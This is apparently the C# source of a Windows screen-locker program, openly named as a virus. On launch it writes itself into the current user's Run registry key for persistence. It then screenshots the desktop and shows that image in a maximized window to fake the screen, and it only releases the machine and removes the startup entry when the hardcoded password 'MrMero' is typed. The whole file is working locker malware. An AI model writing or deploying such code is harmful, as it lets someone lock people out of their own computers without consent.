using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace VirusLockingScreenShowingText
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    /// 
    public partial class MainWindow : Window
    {
        public BitmapImage BitmapToImageSource(Bitmap bitmap)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                bitmap.Save(memory, System.Drawing.Imaging.ImageFormat.Bmp);
                memory.Position = 0;
                BitmapImage bitmapimage = new BitmapImage();
                bitmapimage.BeginInit();
                bitmapimage.StreamSource = memory;
                bitmapimage.CacheOption = BitmapCacheOption.OnLoad;
                bitmapimage.EndInit();

                return bitmapimage;
            }
        }
        public static void AddApplicationToStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("BetterDeleteThisByMero", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void DeleteApplicationFromStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("BetterDeleteThisByMero", false);
            }
        }

        public MainWindow()
        {
            InitializeComponent();
            this.WindowState = WindowState.Minimized;

            AddApplicationToStartup();

            double screenLeft = 0;
            double screenTop = 0;
            double screenWidth = SystemParameters.PrimaryScreenWidth;
            double screenHeight = SystemParameters.PrimaryScreenHeight;

            Bitmap bmp = new Bitmap((int)screenWidth, (int)screenHeight);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen((int)screenLeft, (int)screenTop, 0, 0, bmp.Size);

            image.Source = BitmapToImageSource((Bitmap)bmp);

            this.WindowState = WindowState.Maximized;
            
        }

        private void passwd_KeyDown(object sender, KeyEventArgs e)
        {
            if (passwd.Text == "MrMero")
            {
                DeleteApplicationFromStartup();
                Application.Current.Shutdown();
            }
        }
    }
}
